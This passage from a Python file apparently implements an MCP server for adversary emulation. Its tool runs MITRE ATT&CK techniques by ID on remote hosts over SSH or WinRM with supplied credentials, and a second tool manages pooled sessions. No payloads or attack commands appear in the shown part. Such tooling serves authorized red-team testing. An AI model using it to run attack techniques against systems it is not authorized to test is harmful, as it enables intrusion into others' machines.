            "error": stderr[:500] if not success else None,
        }
    except Exception as exc:
        logger.warning("WinRM execution failed for %s on %s: %s", technique_id, host, exc)
        return {"facts": [], "raw_output": "", "success": False, "error": str(exc)[:500]}


# ---------------------------------------------------------------------------
# MCP tools
# ---------------------------------------------------------------------------


@mcp.tool()
async def execute_technique(
    technique_id: str,
    credential: str,
    protocol: str = "ssh",
    output_parser: str = "",
    persistent_session_key: str = "",
) -> str:
    """Execute a MITRE ATT&CK technique on a target via SSH or WinRM.

    Args:
        technique_id: MITRE ATT&CK technique ID (e.g. "T1592", "T1069.002").
        credential: Credential string. SSH: "user:pass@host:port" or
                    "user@host:port#<base64key>". WinRM: "user:pass@host:port".
        protocol: Execution protocol — "ssh" or "winrm".
        output_parser: How to parse stdout — "" or "first_line" (default),
                       "json", or a regex pattern.
        persistent_session_key: If provided, use persistent SSH session pool
                                keyed by this value (typically operation_id).

    Returns:
        JSON string: {"facts": [...], "raw_output": "...", "success": bool}
    """
    if protocol == "winrm":
        result = await _execute_winrm(technique_id, credential, output_parser)
    elif persistent_session_key:
        result = await _execute_persistent_ssh(
            technique_id, credential, output_parser, persistent_session_key,
        )
    else:
        result = await _execute_direct_ssh(technique_id, credential, output_parser)

    return json.dumps(result)


@mcp.tool()
async def close_sessions(session_key: str) -> str:
    """Close all pooled SSH sessions for a given session key (operation_id).

    Args:
        session_key: The key used when creating persistent sessions
                     (typically the operation_id).

    Returns:
        JSON string: {"closed": <count>}
    """
    keys_to_remove = [k for k in _SESSION_POOL if k[0] == session_key]
    for key in keys_to_remove:
        conn = _SESSION_POOL.pop(key)
        _SESSION_LOCKS.pop(key, None)
        _SESSION_LAST_USED.pop(key, None)
        try:
            conn.close()
        except Exception:
            pass
    if keys_to_remove:
        logger.info("Closed %d sessions for key %s", len(keys_to_remove), session_key)
    return json.dumps({"closed": len(keys_to_remove)})


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser()
    parser.add_argument("--transport", default="stdio", choices=["stdio", "sse", "streamable-http"])
    parser.add_argument("--host", default="0.0.0.0")
    parser.add_argument("--port", type=int, default=8080)
    args = parser.parse_args()

    mcp.settings.host = args.host
    mcp.settings.port = args.port
    mcp.run(transport=args.transport)
